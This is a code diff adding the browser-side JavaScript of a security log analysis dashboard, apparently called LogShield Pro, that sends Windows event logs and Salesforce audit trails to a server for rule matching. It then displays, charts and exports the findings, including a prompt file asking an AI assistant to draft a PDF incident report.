+// WINDOWS ANALYSIS — client gathers raw text, server matches rules
+// ════════════════════════════════════════════════════
+async function runWin(){
+  const text=winLog+'\n'+(el('winPaste').value||'');
+  if(!text.trim()){toast('⚠ Upload or paste Windows Event Log data first');return;}
+  const btn=el('winRunBtn'); btn.disabled=true; btn.innerHTML='⏳ Analysing…';
+  try{
+    const resp=await fetch(`${API_BASE}/log-analyze`,{
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({mode:'windows', text})
+    });
+    if(!resp.ok){const e=await resp.json().catch(()=>({}));throw new Error(e.error||`Server returned ${resp.status}`);}
+    const data=await resp.json();
+    winFindings=data.findings||[];
+    mergeFindings();
+    const lineCount=text.split('\n').filter(l=>l.trim()).length;
+    toast(`✓ Windows: ${winFindings.length} findings from ${lineCount.toLocaleString()} lines`);
+    showPanel('findings');
+  }catch(err){
+    toast('⚠ Analysis failed: '+err.message,6000);
+    console.error(err);
+  }finally{
+    btn.disabled=false; btn.innerHTML='🔍 Analyse Windows Logs';
+  }
+}
+
+// ════════════════════════════════════════════════════
+// SALESFORCE ANALYSIS — client gathers raw rows, server matches rules
+// ════════════════════════════════════════════════════
+async function runSF(){
+  // Always re-parse the textarea fresh (never rely on stale state), and
+  // combine with any rows accumulated from uploaded files.
+  const pasteRows=parseSFCSV(el('sfPaste').value||'');
+  const rows=[...sfFileRows,...pasteRows];
+  if(!rows.length){toast('⚠ Upload or paste Salesforce Audit Trail first');return;}
+  sfRows=rows; // kept for display/debug only
+  const btn=el('sfRunBtn'); btn.disabled=true; btn.innerHTML='⏳ Analysing…';
+  try{
+    const resp=await fetch(`${API_BASE}/log-analyze`,{
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({mode:'salesforce', rows})
+    });
+    if(!resp.ok){const e=await resp.json().catch(()=>({}));throw new Error(e.error||`Server returned ${resp.status}`);}
+    const data=await resp.json();
+    sfFindings=data.findings||[];
+    mergeFindings();
+    if(sfFindings.length===0){
+      toast(`⚠ Parsed ${rows.length.toLocaleString()} audit rows but matched 0 rules — check that your CSV has Section/Action columns with the expected values`,5000);
+    }else{
+      toast(`✓ Salesforce: ${sfFindings.length} findings from ${rows.length.toLocaleString()} audit events`);
+    }
+    showPanel('findings');
+  }catch(err){
+    toast('⚠ Analysis failed: '+err.message,6000);
+    console.error(err);
+  }finally{
+    btn.disabled=false; btn.innerHTML='🔍 Analyse Salesforce Audit Log';
+  }
+}
+
+function mergeFindings(){
+  allFindings=[...winFindings,...sfFindings];
+  allFindings.sort((a,b)=>SEV[a.sev]-SEV[b.sev]||b.count-a.count);
+  updateCounts();renderTable();
+}
+
+// ════════════════════════════════════════════════════
+// COUNTS
+// ════════════════════════════════════════════════════
+function updateCounts(){
+  const c={critical:0,high:0,medium:0,low:0};
+  allFindings.forEach(f=>c[f.sev]=(c[f.sev]||0)+1);
+  el('nc-f').textContent=allFindings.length;
+  el('nc-c').textContent=c.critical;
+  el('nc-h').textContent=c.high;
+  el('nc-m').textContent=c.medium;
+  el('nc-l').textContent=c.low;
+}
+
+// ════════════════════════════════════════════════════
+// RENDER TABLE
+// ════════════════════════════════════════════════════
+function renderTable(){
+  const srch=(el('srch').value||'').toLowerCase();
+  let data=allFindings.filter(f=>{
+    if(activeSev!=='all'&&f.sev!==activeSev) return false;
+    if(!srch) return true;
+    return [f.title,f.eid,f.accounts,f.ips,f.mitre,f.section,f.action,f.detail,f.id,f.domain].some(v=>(v||'').toLowerCase().includes(srch));
+  });
+  data.sort((a,b)=>{
+    let v=0;
+    if(sortCol==='sev') v=SEV[a.sev]-SEV[b.sev];
+    else if(sortCol==='count') v=b.count-a.count;
+    return sortAsc?-v:v;
+  });
+  const body=el('fBody'),empty=el('fEmpty');
+  if(!data.length){body.innerHTML='';empty.style.display='flex';return;}
+  empty.style.display='none';
+  const scl={critical:'sc',high:'sh',medium:'sm',low:'sl'};
+  body.innerHTML=data.map((f,i)=>`<tr>
+    <td><span class="stag ${scl[f.sev]||'sl'}">${f.sev.toUpperCase()}</span>
+      <div style="font-size:8px;font-family:monospace;color:var(--mu2);margin-top:3px">${f.source==='salesforce'?'☁ SF':'🖥 WIN'}${f.id?' · '+f.id:''}</div>
+    </td>
+    <td>${f.source==='salesforce'
+      ?`<span style="font-family:monospace;font-size:9px;background:rgba(188,140,255,.12);border:1px solid rgba(188,140,255,.2);color:var(--pu);padding:2px 7px;border-radius:4px">${esc(f.section)}</span>`
+      :`<span class="eid">${f.eid}</span>`}
+    </td>
+    <td>
+      <div class="ftitle">${esc(f.title)}</div>
+      <div class="fdetail">${esc((f.action||f.detail||'').slice(0,130))}</div>
+      ${f.domain?`<div style="font-size:8px;font-family:monospace;color:var(--pu);margin-top:2px">${esc(f.domain)}</div>`:''}
+    </td>
+    <td style="font-family:monospace;font-size:10px;color:var(--mu)">
+      ${f.accounts?`<div>👤 ${esc(f.accounts)}</div>`:''}
+      ${f.ips?`<div>🌐 ${esc(f.ips)}</div>`:''}
+    </td>
+    <td>
+      ${f.mitre?`<span class="mit">${f.mitre}</span><br/><span style="font-size:9px;color:var(--mu)">${esc(f.tactic)} · ${esc(f.technique)}</span>`
+        :`<span style="font-size:10px;color:var(--mu)">${esc(f.detail.slice(0,80))}</span>`}
+    </td>
+    <td style="font-family:monospace;font-size:13px;font-weight:800;color:${f.count>10?'var(--red)':f.count>5?'var(--or)':'var(--tx)'}">${f.count}</td>
+    <td><button class="dbtn" onclick="detail(${i},${JSON.stringify(data).length>0?i:0})">🔍 Detail</button></td>
+  </tr>`).join('');
+  window._tableData=data;
+}
+
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+function detail(i){
+  const f=window._tableData[i];
+  const lines=(f.lines||[]).map(l=>`<div style="font-family:monospace;font-size:10px;color:var(--mu);padding:4px 8px;background:var(--s2);border-radius:4px;margin-bottom:3px;word-break:break-all">${esc(String(l))}</div>`).join('');
+  const m=document.createElement('div');
+  m.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:500;display:flex;align-items:center;justify-content:center;padding:20px';
+  const scl={critical:'sc',high:'sh',medium:'sm',low:'sl'};
+  m.innerHTML=`<div style="background:var(--s1);border:1px solid var(--border2);border-radius:14px;padding:22px;max-width:660px;width:100%;max-height:80vh;overflow-y:auto">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap">
+      <span class="stag ${scl[f.sev]||'sl'}">${f.sev.toUpperCase()}</span>
+      ${f.id?`<span class="eid">${f.id}</span>`:''}
+      ${f.source==='salesforce'?`<span style="color:var(--pu);font-size:11px;font-family:monospace">☁ ${esc(f.section)}</span>`:`<span class="eid">${f.eid}</span>`}
+      <span style="font-size:13px;font-weight:700;color:var(--tx)">${esc(f.title)}</span>
+      <button onclick="this.closest('[style*=fixed]').remove()" style="margin-left:auto;background:none;border:1px solid var(--border);color:var(--mu);padding:4px 10px;border-radius:6px;cursor:pointer;font-size:11px">✕ Close</button>
+    </div>
+    ${f.domain?`<div style="font-size:10px;font-family:monospace;color:var(--pu);margin-bottom:8px">Domain: ${esc(f.domain)}</div>`:''}
+    <div style="font-size:12px;color:var(--mu);line-height:1.7;margin-bottom:12px">${esc(f.detail)}</div>
+    ${f.mitre?`<div style="margin-bottom:10px"><span class="mit">${f.mitre}</span> <span style="font-size:10px;color:var(--mu)">${esc(f.tactic)} → ${esc(f.technique)}</span></div>`:''}
+    <div style="background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.2);border-radius:8px;padding:11px;margin-bottom:11px">
+      <div style="font-family:monospace;font-size:8px;font-weight:700;letter-spacing:1px;color:var(--red);margin-bottom:5px">RECOMMENDED CONTROL</div>
+      <div style="font-size:11px;color:var(--tx);line-height:1.7">${esc(f.rem||'Review and investigate')}</div>
+    </div>
+    <div style="font-family:monospace;font-size:8px;font-weight:700;letter-spacing:1px;color:var(--mu2);margin-bottom:5px">SAMPLE ENTRIES (${f.count} total)</div>
+    ${lines}
+  </div>`;
+  m.onclick=e=>{if(e.target===m)m.remove();};
+  document.body.appendChild(m);
+}
+
+// ════════════════════════════════════════════════════
+// DASHBOARD
+// ════════════════════════════════════════════════════
+function buildDashboard(){
+  const db=el('dashBody');
+  if(!allFindings.length){db.innerHTML='<div class="empty"><div class="ei">📊</div><div class="et">No data yet</div><div class="es">Run Windows or Salesforce analysis first</div></div>';return;}
+  const win=allFindings.filter(f=>f.source==='windows');
+  const sf=allFindings.filter(f=>f.source==='salesforce');
+  const sev={critical:0,high:0,medium:0,low:0};
+  allFindings.forEach(f=>sev[f.sev]=(sev[f.sev]||0)+1);
+  // Accounts frequency
+  const accMap={};
+  allFindings.forEach(f=>(f.accounts||'').split(',').forEach(a=>{const t=a.trim();if(t&&t.length>1){accMap[t]=(accMap[t]||0)+f.count;}}));
+  const topAccs=Object.entries(accMap).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  // Section frequency (SF)
+  const secMap={};
+  sf.forEach(f=>{const s=f.section||'Other';secMap[s]=(secMap[s]||0)+f.count;});
+  const topSecs=Object.entries(secMap).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  // Win EID frequency
+  const eidMap={};
+  win.forEach(f=>{eidMap[f.eid]=(eidMap[f.eid]||0)+f.count;});
+  const topEIDs=Object.entries(eidMap).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  // Source breakdown
+  const srcMap={'Windows':win.length,'Salesforce':sf.length};
+  // Domain frequency (SF critical matrix)
+  const domMap={};
+  sf.forEach(f=>{if(f.domain){domMap[f.domain]=(domMap[f.domain]||0)+f.count;}});
+  const topDoms=Object.entries(domMap).sort((a,b)=>b[1]-a[1]);
+
+  db.innerHTML=`
+  <!-- KPIs -->
+  <div class="kgrid">
+    <div class="kcard"><div class="kn" style="color:var(--bl)">${allFindings.length}</div><div class="kl">Total Findings</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--red)">${sev.critical}</div><div class="kl">Critical</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--or)">${sev.high}</div><div class="kl">High</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--ye)">${sev.medium}</div><div class="kl">Medium</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--gr)">${sev.low}</div><div class="kl">Low</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--pu)">${win.length}</div><div class="kl">Windows Findings</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--cy)">${sf.length}</div><div class="kl">Salesforce Findings</div></div>
+    <div class="kcard"><div class="kn" style="color:var(--mu)">${topAccs.length}</div><div class="kl">At-Risk Users</div></div>
+  </div>
+
+  <!-- Charts row 1 -->
+  <div class="charts-grid">
+    <div class="chart-card">
+      <div class="chart-title">🎯 Severity Distribution</div>
+      <div class="chart-wrap-sm"><canvas id="cSev"></canvas></div>
+    </div>
+    <div class="chart-card">
+      <div class="chart-title">🔀 Findings by Source</div>
+      <div class="chart-wrap-sm"><canvas id="cSrc"></canvas></div>
+    </div>
+  </div>
+
+  <!-- Charts row 2 -->
+  <div class="charts-grid">
+    ${win.length?`<div class="chart-card">
+      <div class="chart-title">🖥 Top Windows Event IDs</div>
+      <div class="chart-wrap"><canvas id="cEid"></canvas></div>
+    </div>`:''}
+    ${sf.length?`<div class="chart-card">
+      <div class="chart-title">☁ Top Salesforce Sections</div>
+      <div class="chart-wrap"><canvas id="cSec"></canvas></div>
+    </div>`:''}
+  </div>
+
+  <!-- Domain breakdown (SF critical matrix) -->
+  ${topDoms.length?`
+  <div class="sec-t">🗂 Critical Findings by Domain (Salesforce)</div>
+  <table class="sumtable" style="margin-bottom:20px">
+    <thead><tr><th>Domain</th><th>Finding Count</th><th>Frequency</th></tr></thead>
+    <tbody>${topDoms.map(([d,c])=>{
+      const pct=Math.round(c/topDoms[0][1]*100);
+      return `<tr><td style="font-weight:700;color:var(--pu)">${esc(d)}</td>
+        <td style="font-weight:700;color:${c>10?'var(--red)':'var(--tx)'}">${c}</td>
+        <td><div class="bar"><div class="barfill bl" style="width:${pct}%"></div></div></td>
+      </tr>`;}).join('')}
+    </tbody>
+  </table>`:''}
+
+  <!-- At-risk accounts -->
+  ${topAccs.length?`
+  <div class="sec-t">👤 At-Risk Users / Accounts</div>
+  <table class="sumtable" style="margin-bottom:20px">
+    <thead><tr><th>User / Account</th><th>Source</th><th>Finding Count</th><th>Frequency</th></tr></thead>
+    <tbody>${topAccs.map(([a,c])=>{
+      const isSF=sf.some(f=>(f.accounts||'').includes(a));
+      const pct=Math.round(c/topAccs[0][1]*100);
+      return `<tr><td style="font-family:monospace;font-weight:700;color:var(--tx)">${esc(a)}</td>
+        <td>${isSF?'<span style="color:var(--pu)">☁ SF</span>':'<span style="color:var(--bl)">🖥 WIN</span>'}</td>
+        <td style="font-weight:700;color:${c>10?'var(--red)':c>5?'var(--or)':'var(--tx)'}">${c}</td>
+        <td><div class="bar"><div class="barfill${isSF?' bl':''}" style="width:${pct}%"></div></div></td>
+      </tr>`;}).join('')}
+    </tbody>
+  </table>`:''}
+
+  <!-- Critical findings summary -->
+  <div class="sec-t">🔴 Critical Findings Summary</div>
+  <table class="sumtable">
+    <thead><tr><th>Source</th><th>ID</th><th>Finding</th><th>Section / EID</th><th>Users</th><th>Count</th></tr></thead>
+    <tbody>${allFindings.filter(f=>f.sev==='critical').slice(0,30).map(f=>`<tr>
+      <td>${f.source==='salesforce'?'<span style="color:var(--pu)">☁ SF</span>':'<span style="color:var(--bl)">🖥 WIN</span>'}</td>
+      <td style="font-family:monospace;font-size:10px;color:var(--pu)">${esc(f.id||'—')}</td>
+      <td style="font-weight:600;color:var(--tx)">${esc(f.title)}</td>
+      <td style="font-family:monospace;font-size:10px;color:var(--mu)">${f.source==='salesforce'?esc(f.section):f.eid}</td>
+      <td style="font-family:monospace;font-size:10px;color:var(--mu)">${esc((f.accounts||'—').slice(0,40))}</td>
+      <td style="font-weight:700;color:var(--red)">${f.count}</td>
+    </tr>`).join('')}
+    </tbody>
+  </table>`;
+
+  // Destroy old charts
+  Object.values(charts).forEach(c=>{try{c.destroy();}catch(e){}});
+  charts={};
+
+  const chartDefaults={color:'#68727e',borderColor:'rgba(104,114,126,.2)'};
+  Chart.defaults.color=chartDefaults.color;
+  Chart.defaults.borderColor=chartDefaults.borderColor;
+
+  // Severity donut
+  const cSev=el('cSev');
+  if(cSev) charts.sev=new Chart(cSev,{type:'doughnut',data:{
+    labels:['Critical','High','Medium','Low'],
+    datasets:[{data:[sev.critical,sev.high,sev.medium,sev.low],
+      backgroundColor:['rgba(248,81,73,.8)','rgba(240,136,62,.8)','rgba(210,153,34,.8)','rgba(63,185,80,.8)'],
+      borderColor:['#f85149','#f0883e','#d29922','#3fb950'],borderWidth:2}]
+  },options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{position:'right',labels:{padding:12,font:{size:11}}}}}});
+
+  // Source bar
+  const cSrc=el('cSrc');
+  if(cSrc) charts.src=new Chart(cSrc,{type:'bar',data:{
+    labels:Object.keys(srcMap),
+    datasets:[{data:Object.values(srcMap),
+      backgroundColor:['rgba(88,166,255,.7)','rgba(188,140,255,.7)'],
+      borderColor:['#58a6ff','#bc8cff'],borderWidth:2,borderRadius:6}]
+  },options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{y:{beginAtZero:true,grid:{color:'rgba(15,23,32,.06)'}},x:{grid:{display:false}}}}});
+
+  // Top EIDs bar
+  const cEid=el('cEid');
+  if(cEid&&topEIDs.length) charts.eid=new Chart(cEid,{type:'bar',data:{
+    labels:topEIDs.map(e=>e[0]),
+    datasets:[{label:'Occurrences',data:topEIDs.map(e=>e[1]),
+      backgroundColor:'rgba(88,166,255,.7)',borderColor:'#58a6ff',borderWidth:2,borderRadius:4}]
+  },options:{indexAxis:'y',responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{x:{beginAtZero:true,grid:{color:'rgba(15,23,32,.06)'}},y:{grid:{display:false}}}}});
+
+  // Top Sections bar
+  const cSec=el('cSec');
+  if(cSec&&topSecs.length) charts.sec=new Chart(cSec,{type:'bar',data:{
+    labels:topSecs.map(s=>s[0].length>20?s[0].slice(0,20)+'…':s[0]),
+    datasets:[{label:'Findings',data:topSecs.map(s=>s[1]),
+      backgroundColor:'rgba(188,140,255,.7)',borderColor:'#bc8cff',borderWidth:2,borderRadius:4}]
+  },options:{indexAxis:'y',responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{x:{beginAtZero:true,grid:{color:'rgba(15,23,32,.06)'}},y:{grid:{display:false}}}}});
+}
+
+// ════════════════════════════════════════════════════
+// EXPORTS
+// ════════════════════════════════════════════════════
+function exportExcel(){
+  if(!allFindings.length){toast('⚠ Run analysis first');return;}
+  const NAVY='1E3A5F',W='FFFFFF',R='FEE2E2',A='FEF3C7',G='D1FAE5',B='DBEAFE',P='EDE9FE';
+  const hdrs=['Source','Severity','ID','Domain','Finding','Section/EID','Action/Detail','User(s)','Source IP(s)','MITRE ID','Tactic','Technique','Count','Recommended Control'];
+  const rows=[hdrs,...allFindings.map(f=>[
+    f.source==='salesforce'?'☁ Salesforce':'🖥 Windows',
+    f.sev.toUpperCase(),f.id||'',f.domain||'',f.title,f.source==='salesforce'?f.section:f.eid,
+    f.action||f.detail,f.accounts||'',f.ips||'',
+    f.mitre||'',f.tactic||'',f.technique||'',f.count,f.rem||''
+  ])];
+  const ws=XLSX.utils.aoa_to_sheet(rows);
+  ws['!cols']=[10,10,10,20,28,16,32,20,14,10,18,18,6,40].map(w=>({wch:w}));
+  const range=XLSX.utils.decode_range(ws['!ref']);
+  for(let c=range.s.c;c<=range.e.c;c++){
+    const a=XLSX.utils.encode_cell({r:0,c});
+    if(ws[a]) ws[a].s={font:{bold:true,color:{rgb:W}},fill:{fgColor:{rgb:NAVY}}};
+  }
+  allFindings.forEach((f,ri)=>{
+    const bg=f.sev==='critical'?R:f.sev==='high'?A:f.sev==='medium'?'FFFBEB':G;
+    const srcBg=f.source==='salesforce'?P:B;
+    const a0=XLSX.utils.encode_cell({r:ri+1,c:0});
+    if(ws[a0]) ws[a0].s={fill:{fgColor:{rgb:srcBg}},font:{bold:false}};
+    const a1=XLSX.utils.encode_cell({r:ri+1,c:1});
+    if(ws[a1]) ws[a1].s={fill:{fgColor:{rgb:bg}},font:{bold:true}};
+  });
+  const wsSF=XLSX.utils.aoa_to_sheet([
+    ['ID','Domain','Section','Severity','Finding','Users','Count','Recommended Control'],
+    ...allFindings.filter(f=>f.source==='salesforce').map(f=>[f.id||'',f.domain||'',f.section,f.sev.toUpperCase(),f.title,f.accounts||'',f.count,f.rem||''])
+  ]);
+  const wsSFCrit=XLSX.utils.aoa_to_sheet([
+    ['ID','Domain','Change / Action (Critical - Requires Authorization)','Why It Must Be Restricted','Where It\'s Made in Setup','Recommended Control','Observed Count','Users'],
+    ...allFindings.filter(f=>f.source==='salesforce'&&f.sev==='critical').map(f=>[f.id||'',f.domain||'',f.title,f.detail,f.section,f.rem||'',f.count,f.accounts||''])
+  ]);
+  const wsWin=XLSX.utils.aoa_to_sheet([
+    ['Event ID','Severity','Finding','MITRE','Tactic','Accounts','Source IPs','Count'],
+    ...allFindings.filter(f=>f.source==='windows').map(f=>[f.eid,f.sev.toUpperCase(),f.title,f.mitre||'',f.tactic||'',f.accounts||'',f.ips||'',f.count])
+  ]);
+  const wb=XLSX.utils.book_new();
+  XLSX.utils.book_append_sheet(wb,ws,'All Findings');
+  XLSX.utils.book_append_sheet(wb,wsSFCrit,'SF Critical Unauthorized');
+  XLSX.utils.book_append_sheet(wb,wsSF,'Salesforce');
+  XLSX.utils.book_append_sheet(wb,wsWin,'Windows');
+  XLSX.writeFile(wb,`LogShield_Pro_${new Date().toISOString().slice(0,10)}.xlsx`);
+  toast('✓ Excel exported — 4 sheets');
+}
+
+function exportCSV(){
+  if(!allFindings.length){toast('⚠ Run analysis first');return;}
+  const h=['Source','ID','Domain','Severity','Finding','Section/EID','Users','MITRE','Count'];
+  const rows=[h,...allFindings.map(f=>[
+    f.source,f.id||'',f.domain||'',f.sev,f.title,f.source==='salesforce'?f.section:f.eid,f.accounts||'',f.mitre||'',f.count
+  ])];
+  const csv=rows.map(r=>r.map(c=>`"${String(c||'').replace(/"/g,'""')}"`).join(',')).join('\n');
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));
+  a.download=`LogShield_Pro_${new Date().toISOString().slice(0,10)}.csv`;
+  a.click();
+  toast('✓ CSV exported');
+}
+
+function exportReport(){
+  if(!allFindings.length){toast('⚠ Run analysis first');return;}
+  const win=allFindings.filter(f=>f.source==='windows');
+  const sf=allFindings.filter(f=>f.source==='salesforce');
+  const sev={critical:0,high:0,medium:0,low:0};
+  allFindings.forEach(f=>sev[f.sev]=(sev[f.sev]||0)+1);
+  let r=`╔════════════════════════════════════════════════════════════════╗
+║      LOGSHIELD PRO — UNIFIED THREAT INTELLIGENCE REPORT       ║
+╚════════════════════════════════════════════════════════════════╝
+
+Generated:          ${new Date().toLocaleString()}
+Windows Findings:   ${win.length}
+Salesforce Findings: ${sf.length}
+Total Findings:     ${allFindings.length}
+
+SEVERITY BREAKDOWN
+──────────────────
+  CRITICAL : ${sev.critical}
+  HIGH     : ${sev.high}
+  MEDIUM   : ${sev.medium}
+  LOW      : ${sev.low}
+
+CRITICAL FINDINGS
+${'─'.repeat(66)}
+${allFindings.filter(f=>f.sev==='critical').map((f,i)=>`
+${i+1}. [${f.id?f.id+' · ':''}${f.source==='salesforce'?'SF: '+f.section:'WIN: EID '+f.eid}] ${f.title}
+   Count:       ${f.count}
+   User(s):     ${f.accounts||'N/A'}
+   ${f.domain?`Domain:      ${f.domain}\n   `:''}${f.mitre?`MITRE:       ${f.mitre} — ${f.tactic} · ${f.technique}`:`Risk:        ${f.detail}`}
+   Recommended Control: ${f.rem||'Review and investigate'}
+`).join('')}
+
+HIGH SEVERITY FINDINGS
+${'─'.repeat(66)}
+${allFindings.filter(f=>f.sev==='high').map((f,i)=>`
+${i+1}. [${f.source==='salesforce'?'SF: '+f.section:'WIN: EID '+f.eid}] ${f.title}
+   Count: ${f.count} · User(s): ${f.accounts||'N/A'}
+   Remediation: ${f.rem||'Review'}
+`).join('')}
+
+─────────────────────────────────────────────
+LogShield Pro · IA IT Portal · Internal Use Only`;
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([r],{type:'text/plain'}));
+  a.download=`LogShield_Pro_Report_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+  toast('✓ Report exported');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// AI REPORT INSTRUCTIONS — packages current findings + a prompt so
+// Claude (or any AI platform) can generate a polished PDF report.
+// ═══════════════════════════════════════════════════════════════
+function buildLogReportData(){
+  const win=allFindings.filter(f=>f.source==='windows');
+  const sf=allFindings.filter(f=>f.source==='salesforce');
+  const sev={critical:0,high:0,medium:0,low:0};
+  allFindings.forEach(f=>sev[f.sev]=(sev[f.sev]||0)+1);
+
+  return {
+    generatedAt:new Date().toISOString(),
+    summary:{totalFindings:allFindings.length,windowsFindings:win.length,salesforceFindings:sf.length,severityCounts:sev},
+    findings:allFindings.map(f=>({
+      source:f.source, severity:f.sev, id:f.id||undefined, domain:f.domain||undefined,
+      eventIdOrSection:f.source==='salesforce'?f.section:f.eid,
+      title:f.title, detail:f.detail, action:f.action||undefined,
+      accounts:f.accounts||undefined, sourceIPs:f.ips||undefined,
+      mitre:f.mitre||undefined, tactic:f.tactic||undefined, technique:f.technique||undefined,
+      count:f.count, recommendedControl:f.rem
+    }))
+  };
+}
+
+// ═══════════════════════════════════════════════════════════════
+// PLAIN JSON EXPORT — for attaching directly to a Claude conversation
+// (or any AI platform / downstream tool) without the instructions text.
+// ═══════════════════════════════════════════════════════════════
+function exportJSONForClaude(){
+  if(!allFindings.length){toast('⚠ Run analysis first');return;}
+  const data=buildLogReportData();
+  const a2=document.createElement('a');
+  a2.href=URL.createObjectURL(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}));
+  a2.download=`LogShield_Pro_Findings_${new Date().toISOString().slice(0,10)}.json`;
+  a2.click();
+  toast('✓ JSON findings exported — attach to a Claude chat and ask it to generate a report');
+}
+
+function exportAIReportInstructions(){
+  if(!allFindings.length){toast('⚠ Run analysis first');return;}
+  const dataJSON=JSON.stringify(buildLogReportData(),null,2);
+
+  const instructions=`UNIFIED THREAT INTELLIGENCE REPORT (WINDOWS + SALESFORCE) — AI REPORT GENERATION INSTRUCTIONS
+Generated: ${new Date().toLocaleString()}
+
+═══════════════════════════════════════════════════════════════
+HOW TO USE THIS FILE
+═══════════════════════════════════════════════════════════════
+Upload or paste this entire file to Claude (claude.ai) or another AI assistant with
+document/PDF generation capability, then ask it to "generate the PDF report described
+in these instructions." Everything the AI needs — the raw findings data and the report
+structure/formatting requirements — is included below.
+
+═══════════════════════════════════════════════════════════════
+TASK
+═══════════════════════════════════════════════════════════════
+Produce a professional, incident-report-style PDF (or a Word document suitable for
+conversion to PDF) summarizing the combined Windows Event Log and Salesforce Setup
+Audit Trail findings in the JSON data block at the end of this file. The audience is
+IT security, incident response, and internal audit — write in a formal, objective,
+evidence-based tone. Do not invent any finding, score, Event ID, or Salesforce rule ID
+not present in the JSON.
+
+═══════════════════════════════════════════════════════════════
+REQUIRED REPORT STRUCTURE
+═══════════════════════════════════════════════════════════════
+1. COVER PAGE
+   - Title: "Unified Threat Intelligence Report — Windows & Salesforce"
+   - Subtitle: analysis date, "Confidential — Internal Use Only"
+
+2. EXECUTIVE SUMMARY (half page)
+   - Total findings, split by source (Windows vs Salesforce) and by severity
+   - One-paragraph plain-language summary of overall risk posture
+   - Top 3-5 Critical findings requiring immediate attention
+
+3. SEVERITY & SOURCE BREAKDOWN TABLE
+   - One row per severity level with counts, and a separate Windows vs Salesforce split
+
+4. WINDOWS EVENT LOG FINDINGS
+   - Table: Event ID, Severity, Finding, MITRE ATT&CK ID/Tactic/Technique (where present),
+     Accounts, Source IPs, Count, Recommended Control
+   - Group by severity, Critical first
+
+5. SALESFORCE AUDIT TRAIL FINDINGS
+   - Table: Rule ID, Domain, Severity, Finding, Section, Users, Count, Recommended Control
+   - Group by severity, Critical first
+   - If any findings carry a "domain" (e.g. Access & Identity, Data Governance, Code &
+     Automation, Integration & Payments, Business-Critical Config), summarize counts by
+     domain in a short subsection
+
+6. RECOMMENDATIONS / INCIDENT RESPONSE ACTIONS
+   - Every Critical finding gets an explicit "immediate action" recommendation
+   - Group remaining recommendations by source and severity
+
+7. APPENDIX
+   - Full findings list in tabular form for audit trail completeness
+
+FORMATTING REQUIREMENTS:
+- Use clear headers/subheaders matching the sections above
+- Use tables for findings — not paragraphs of prose
+- Color or bold Critical/High severity labels for scannability if the output format
+  supports it
+- Do not fabricate any finding, count, Event ID, or rule ID not present in the JSON below
+
+═══════════════════════════════════════════════════════════════
+FINDINGS DATA (JSON)
+═══════════════════════════════════════════════════════════════
+${dataJSON}
+`;
+
+  const a2=document.createElement('a');
+  a2.href=URL.createObjectURL(new Blob([instructions],{type:'text/plain'}));
+  a2.download=`LogShield_Pro_AI_Report_Instructions_${new Date().toISOString().slice(0,10)}.txt`;
+  a2.click();
+  toast('✓ AI report instructions exported');
+}
+
+// Rule counts are now static in the HTML above (the rule library itself lives server-side).
+</script></body></html>
